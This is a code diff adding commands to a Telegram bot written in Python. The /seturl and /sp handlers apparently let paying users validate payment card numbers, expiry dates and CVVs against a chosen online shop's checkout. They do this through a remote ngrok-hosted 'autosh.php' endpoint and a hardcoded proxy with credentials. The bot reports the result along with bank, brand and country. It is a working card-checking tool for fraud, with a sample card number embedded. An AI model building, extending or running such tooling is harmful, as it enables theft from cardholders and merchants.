@@ -2597,6 +2597,156 @@ async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+import aiohttp
+from db import get_user, update_user
+from html import escape
+
+API_CHECK_TEMPLATE = "https://7feeef80303d.ngrok-free.app/autosh.php?cc=5444228607773355|04|28|974&site={site}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+
+async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handler for /seturl command."""
+    user_id = update.effective_user.id
+    args = context.args
+
+    if not args:
+        await update.message.reply_text("❌ Please provide a site URL. Example: /seturl shop.meltingpot.com")
+        return
+
+    # Fetch user data
+    user_data = await get_user(user_id)
+    if user_data.get("custom_url"):
+        await update.message.reply_text(
+            "❌ You already have a site set. Please remove it first using /remove."
+        )
+        return
+
+    # Construct proper URL starting with https://
+    site_input = args[0].strip()
+    if not site_input.startswith("http://") and not site_input.startswith("https://"):
+        site_input = f"https://{site_input}"
+
+    # Send initial "Adding URL..." message
+    msg = await update.message.reply_text(f"⏳ Adding URL: {escape(site_input)}...", parse_mode=ParseMode.HTML)
+
+    # Check site via API
+    api_url = API_CHECK_TEMPLATE.format(site=site_input)
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=30) as resp:
+                data = await resp.json()
+    except Exception as e:
+        await msg.edit_text(f"❌ Failed to check site: {e}")
+        return
+
+    # Parse API response
+    response_text = data.get("Response", "Unknown")
+    price = data.get("Price", "-")
+    gateway = data.get("Gateway", "-")
+
+    # Update DB for the user
+    await update_user(user_id, custom_url=site_input)
+
+    # Format final message
+    final_message = f"""
+═══[ {gateway.upper()} ]═══
+[✗] Site ➜ {site_input}
+
+[✗] Amount ➜ {price}  
+[✗] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_text}
+
+――――――――――――――――
+[✗] 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ @{update.effective_user.username or update.effective_user.first_name}
+
+[✗] 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ kคli liຖนxx
+――――――――――――――――
+"""
+
+    await msg.edit_text(final_message, parse_mode=ParseMode.MARKDOWN_V2)
+
+
+
+async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    user_data = await get_user(user_id)
+
+    if not user_data.get("custom_url"):
+        await update.message.reply_text("❌ You don’t have any URL set.")
+        return
+
+    await update_user(user_id, custom_url=None)
+    await update.message.reply_text("✅ Your URL has been removed. You can now set a new one using /seturl.")
+
+
+
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
+import aiohttp
+from db import get_user
+from html import escape
+
+API_CHECK_TEMPLATE = "https://7feeef80303d.ngrok-free.app/autosh.php?cc={card}&site={site}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+
+async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handler for /sp card|mm|yy|cvv"""
+    user_id = update.effective_user.id
+    args = context.args
+
+    if not args:
+        await update.message.reply_text("❌ Please provide card details. Example: /sp 5444228607773355|04|28|974")
+        return
+
+    user_data = await get_user(user_id)
+    custom_url = user_data.get("custom_url")
+    if not custom_url:
+        await update.message.reply_text("❌ You don't have a site set. Use /seturl to set your site first.")
+        return
+
+    card_input = args[0].strip()
+
+    # Send initial "Checking..." message
+    msg = await update.message.reply_text(f"⏳ Checking card: {escape(card_input)}...", parse_mode=ParseMode.HTML)
+
+    api_url = API_CHECK_TEMPLATE.format(card=card_input, site=custom_url)
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=30) as resp:
+                data = await resp.json()
+    except Exception as e:
+        await msg.edit_text(f"❌ Failed to check card: {e}")
+        return
+
+    # Parse API response
+    response_text = data.get("Response", "Unknown")
+    price = data.get("Price", "-")
+    gateway = data.get("Gateway", "-")
+    brand = data.get("Brand", "-")
+    bank = data.get("Bank", "-")
+    country = data.get("Country", "-")
+    credits_left = user_data.get("credits", 0)
+
+    # Format final message
+    final_message = f"""
+═══[ {gateway.upper()} ]═══
+[✗] 𝐂𝐚𝐫𝐝 ➜ {card_input}
+[✗] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ {gateway}
+[✗] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response_text}
+――――――――――――――――
+[✗] 𝐁𝐫𝐚𝐧𝐝 ➜ {brand}
+[✗] 𝐁𝐚𝐧𝐤 ➜ {bank}
+[✗] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country}
+――――――――――――――――
+[✗] 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ @{update.effective_user.username or update.effective_user.first_name}
+[✗] 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐋𝐞𝐟𝐭 ➜ {credits_left}
+[✗] 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ kคli liຖนxx
+――――――――――――――――
+"""
+
+    await msg.edit_text(final_message, parse_mode=ParseMode.MARKDOWN_V2)
 
 
 
@@ -3663,6 +3813,9 @@ def main():
     application.add_handler(CommandHandler("mass", mass_command))
     application.add_handler(CommandHandler("mtchk", mtchk))
     application.add_handler(CommandHandler("sh", sh_command))
+    application.add_handler(CommandHandler("seturl", seturl, block=False))
+    application.add_handler(CommandHandler("remove", removeurl, block=False))
+    application.add_handler(CommandHandler("sp", sp, block=False))
     application.add_handler(CommandHandler("gen", gen))
     application.add_handler(CommandHandler("open", open_command))
     application.add_handler(CommandHandler("adcr", adcr_command))
